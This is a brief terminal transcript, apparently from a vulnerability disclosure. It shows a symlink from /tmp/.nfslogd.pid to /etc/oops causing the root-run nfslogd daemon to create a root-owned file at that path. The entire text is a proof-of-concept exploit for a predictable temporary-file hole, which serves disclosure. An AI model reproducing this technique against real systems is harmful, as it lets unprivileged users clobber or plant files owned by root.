Don't Panic! # ls -dl /etc/oops
/etc/oops: No such file or directory
Don't Panic! # ls -dl /tmp/.nfslogd.pid
lrwxrwxrwx   1 nobody   nobody         9 Dec 29 21:24 /tmp/.nfslogd.pid
-> /etc/oops
Don't Panic! # id
uid=0(root) gid=0(root)
Don't Panic! # /usr/lib/nfs/nfslogd
Don't Panic! # ls -dl /etc/oops
-rw-------   1 root     root           4 Dec 29 21:25 /etc/oops
